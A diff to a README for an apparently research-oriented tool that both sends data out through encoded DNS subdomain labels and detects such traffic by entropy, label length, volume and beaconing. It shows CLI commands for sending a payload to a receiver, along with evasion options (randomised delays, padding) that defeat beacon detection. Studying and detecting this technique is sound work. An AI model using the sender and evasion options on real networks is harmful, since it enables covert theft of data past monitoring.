@@ -8,7 +8,7 @@ A dual-sided research implementation of DNS-based data exfiltration and detectio
 flowchart TD
     A([Payload bytes]) --> B[DNSExfilEncoder\nhex · base32 · base64]
     B --> C["DNS labels\nNN_tag_chunk.target-domain"]
-    C --> D[Scapy DNS sender\nraw UDP/port 53]
+    C --> D[Scapy DNS sender\nraw UDP/configurable port]
     D --> E[(Network / PCAP)]
 
     E --> F[parse_pcap\nor parse_zeek_dns_log]
@@ -60,31 +60,42 @@ python -m cli.main detect --pcap sample_data/exfil_session.pcap
 python -m cli.main detect --pcap sample_data/exfil_session.pcap --format html --output report.html
 ```
 
+**End-to-end receiver demo (requires sudo for raw sockets):**
+
+```bash
+# Terminal 1 — start the receiver on port 5353
+python -m cli.main receive --port 5353
+
+# Terminal 2 — send to the receiver's port
+sudo python -m cli.main send --payload "secret" \
+    --server 127.0.0.1 --server-port 5353 --domain exfil.invalid
+```
+
 ## Screenshots
 
 **Dry-run output — three encodings side by side:**
 
-![Dry-run CLI output showing hex, base32, base64 FQDNs](docs/screenshots/dry_run_encodings.png)
+![Dry-run CLI output showing hex, base32, base64 FQDNs](screenshots/dry_run_encodings.png)
 
 **Detector output — basic exfil session:**
 
-![CLI detect output showing high confidence alert with four signals](docs/screenshots/detect_basic.png)
+![CLI detect output showing high confidence alert with four signals](screenshots/detect_basic.png)
 
 **Detector output — evasion session (beacon signal absent):**
 
-![CLI detect output showing high confidence but no beacon signal](docs/screenshots/detect_evasion.png)
+![CLI detect output showing high confidence but no beacon signal](screenshots/detect_evasion.png)
 
 **Wireshark — encoded subdomain labels in PCAP:**
 
-![Wireshark showing DNS queries with long hex-encoded subdomains](docs/screenshots/wireshark_basic.png)
+![Wireshark showing DNS queries with long hex-encoded subdomains](screenshots/wireshark_basic.png)
 
 **HTML detection report:**
 
-![Browser showing the self-contained HTML report with domain cards](docs/screenshots/html_report.png)
+![Browser showing the self-contained HTML report with domain cards](screenshots/html_report.png)
 
 **Benchmark output:**
 
-![Terminal showing benchmark comparison of basic vs evasion session](docs/screenshots/benchmark.png)
+![Terminal showing benchmark comparison of basic vs evasion session](screenshots/benchmark.png)
 
 ## Benchmark results
 
@@ -95,7 +106,7 @@ Detection run against real PCAP captures taken on a Kali Linux VM:
 | basic   | 67      | high       | 3.16        | 33.0          | high   |
 | evasion | 67      | high       | 3.50        | 37.0          | low    |
 
-The evasion variant defeats beacon detection (CV rises from 0.02 to 0.48 with randomised delays) but remains detectable via entropy and label length. The `beaconing detected` signal is absent from the evasion session output. See `docs/detection_limits.md`.
+The evasion variant defeats beacon detection (CV rises from 0.02 to 0.48 with randomised delays) but remains detectable via entropy and label length. See `docs/detection_limits.md`.
 
 ## Detection matrix
 
@@ -132,13 +143,13 @@ The receiver reads the tag from each label, strips evasion padding using the enc
 | Query volume | > 20 queries/domain | Sessions with payloads above ~285 bytes |
 | Beaconing CV | < 0.15 high / < 0.30 medium | Fixed-interval automated senders |
 
-Confidence grading: `high` when entropy + length both fire, or when either fires alongside beacon. `medium` for any single signal. Per-source-IP tracking is included — sessions from multiple hosts to the same domain are noted in signals.
+Confidence grading: `high` when entropy + length both fire, or when either fires alongside beacon. `medium` for any single signal. Per-source-IP tracking is included.
 
 ## CLI reference
 
 ```
 python -m cli.main send     --payload TEXT | --file PATH
-                            [--domain TEXT] [--server TEXT]
+                            [--domain TEXT] [--server TEXT] [--server-port INT]
                             [--encoding hex|base32|base64]
                             [--delay FLOAT] [--dry-run]
                             [--evasion] [--min-delay FLOAT] [--max-delay FLOAT] [--padding INT]
@@ -156,7 +167,7 @@ python -m cli.main benchmark [--sample-dir PATH] [--json]
 python -m cli.main research  --sweep | --matrix [--output PATH]
 ```
 
-Live packet transmission (`send` without `--dry-run`, `receive`) requires `sudo`.
+`send` without `--dry-run` and `receive` require `sudo`.
 All other subcommands run without root or network access.
 
 ## Project structure
